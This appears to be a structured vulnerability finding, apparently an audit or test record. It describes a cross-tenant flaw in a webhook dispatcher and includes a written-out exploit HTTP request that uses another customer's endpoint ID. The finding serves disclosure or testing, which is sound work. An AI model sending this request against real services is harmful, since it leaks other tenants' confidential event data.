diagnosis: The webhook dispatcher stream worker retrieves the destination URL from endpointId and dispatches payloadJson without verifying that endpoint.tenantId matches the event's tenantId. An attacker submitting an event for their own tenant can pass an endpointId belonging to another customer to force confidential event data or internal callbacks to be routed to attacker-controlled webhooks.
exploit_request:
POST /api/tenants/events/publish HTTP/1.1
Host: api.eventrelay.net
Authorization: Bearer <tenant_user_token>
Content-Type: application/json

{"endpointId": "whk_customer_b_secret_listener", "payloadJson": "{\"event\": \"tenant.key.rotated\"}"}
